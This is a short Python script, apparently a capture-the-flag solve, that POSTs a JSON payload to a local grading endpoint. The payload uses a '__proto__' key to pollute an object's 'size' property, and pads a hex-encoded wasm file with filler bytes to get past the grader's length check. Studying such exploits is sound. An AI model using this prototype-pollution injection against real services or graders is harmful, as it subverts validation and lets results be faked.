N = 424
from binascii import *
import requests

data = open("./solution.wasm", "rb").read()

assert len(data) == 737

payload = {
    "__proto__": {
        "size": N + len(data)
    },
    "input": "ff"*N + b2a_hex(data).decode()
}

HOST = "http://localhost:8000/grade"

res = requests.post(HOST, json=payload)
print(res.content)


